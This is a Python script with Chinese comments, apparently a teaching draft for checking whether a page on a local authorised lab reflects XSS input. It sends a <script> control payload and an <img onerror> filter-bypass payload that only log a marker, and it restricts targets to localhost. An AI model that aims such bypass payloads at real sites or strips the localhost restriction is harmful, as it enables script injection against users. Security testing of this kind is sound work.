#!/usr/bin/env python3
# XSS-002 反射型 XSS 教学验证草案（仅用于本地授权靶场）
# 约束：只允许 localhost / 127.0.0.1 / ::1；不跟随重定向；不打印、不外传 Cookie。
# 仅使用标准库。Python 3.8+。
import argparse
import json
import urllib.error
import urllib.parse
import urllib.request

MARKER = "LLM_LAB_XSS"
BYPASS = '<img src=x onerror="console.log(\'LLM_LAB_XSS\')">'
CONTROL = '<script>console.log(\'LLM_LAB_XSS\')</script>'
ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """拒绝自动跟随 3xx，避免把测试流量带去未知主机。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect blocked: " + newurl, headers, fp
        )


def check_target(base_url):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("仅允许 http/https，实际为: %r" % (parts.scheme,))
    host = parts.hostname or ""
    if host not in ALLOWED_HOSTS:
        raise SystemExit(
            "仅允许本机地址，实际为: %r；其它已授权地址请单独记录后再改脚本" % (host,)
        )


def build_url(base_url, path, param, value):
    return (
        base_url.rstrip("/")
        + "/"
        + path.lstrip("/")
        + "?"
        + urllib.parse.urlencode({param: value})
    )


def fetch(url, cookie):
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", "llm-lab-xss-draft/1.0")
    if cookie:
        req.add_header("Cookie", cookie)
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=10) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, ""
    except urllib.error.URLError as exc:
        raise SystemExit("连接失败（属于环境问题，不是漏洞证据）: %s" % (exc.reason,))


def main():
    ap = argparse.ArgumentParser(description="XSS-002 反射型 XSS 草案（本地靶场）")
    ap.add_argument("--base-url", required=True, help="例如 http://127.0.0.1:8080")
    ap.add_argument("--path", required=True, help="承载 name 参数的页面路径，需人工确认")
    ap.add_argument("--param", default="name", help="已知参数名：name")
    ap.add_argument("--cookie-file", default=None,
                    help="本地文件，首行为 Cookie 头；内容不写入仓库也不打印")
    args = ap.parse_args()

    check_target(args.base_url)

    cookie = None
    if args.cookie_file:
        with open(args.cookie_file, "r", encoding="utf-8") as fh:
            cookie = fh.readline().strip()

    report = {"marker": MARKER, "cases": {}}
    for label, value in (("control_lower_script", CONTROL),
                         ("bypass_img_onerror", BYPASS)):
        url = build_url(args.base_url, args.path, args.param, value)
        status, body = fetch(url, cookie)
        report["cases"][label] = {
            "status": status,
            "url": url,
            "raw_payload_in_body": value in body,
            "lower_script_tag_in_body": "<script>" in body.lower(),
            "body_length": len(body),
        }

    report["note"] = (
        "raw_payload_in_body=True 只说明响应回显了输入，不证明浏览器执行。"
        "必须由人工在浏览器打开同一 URL，确认 DevTools console 出现 "
        + MARKER
        + "；同时记录是否显示为文本（编码生效）与是否真正执行。"
    )
    print(json.dumps(report, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
